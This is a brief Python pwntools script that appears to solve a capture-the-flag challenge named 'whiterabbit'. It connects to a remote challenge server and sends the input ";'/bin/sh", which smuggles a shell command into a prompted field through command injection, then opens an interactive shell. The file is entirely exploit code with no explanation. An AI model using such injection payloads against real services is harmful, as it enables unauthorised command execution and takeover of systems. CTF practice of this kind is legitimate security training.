#!/usr/bin/python3
from pwn import *
from past.builtins import xrange
from time import sleep
import random

if __name__ == '__main__':
	io = remote('chal.ctf.b01lers.com',1013)
#	io = process('./whiterabbit-cacd63e38e13130a3381342eacfbb623')
	pause()
	io.sendlineafter(': ',";\'/bin/sh")
	io.interactive()
